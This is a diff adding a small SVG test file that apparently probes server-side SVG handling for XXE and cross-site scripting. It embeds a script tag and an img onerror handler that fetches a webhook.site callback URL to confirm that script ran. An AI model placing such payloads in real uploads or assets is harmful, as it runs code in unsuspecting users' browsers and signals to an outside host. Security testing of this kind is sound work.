@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="200" height="200">
+  <!-- Test: XXE via DOCTYPE (if SVG is parsed server-side) -->
+  <!-- Test: external entity loading -->
+  <title>SVG Test 31754</title>
+  <text x="10" y="50" font-size="20">nonce=31754</text>
+  <!-- Test: foreignObject with HTML -->
+  <foreignObject width="200" height="200">
+    <html xmlns="http://www.w3.org/1999/xhtml">
+      <body>
+        <script>document.write('31754')</script>
+        <img src="x" onerror="fetch('https://webhook.site/bfac32e7-7c67-41f0-bf29-b2c2ff7238ce?svg=31754')"/>
+      </body>
+    </html>
+  </foreignObject>
+</svg>
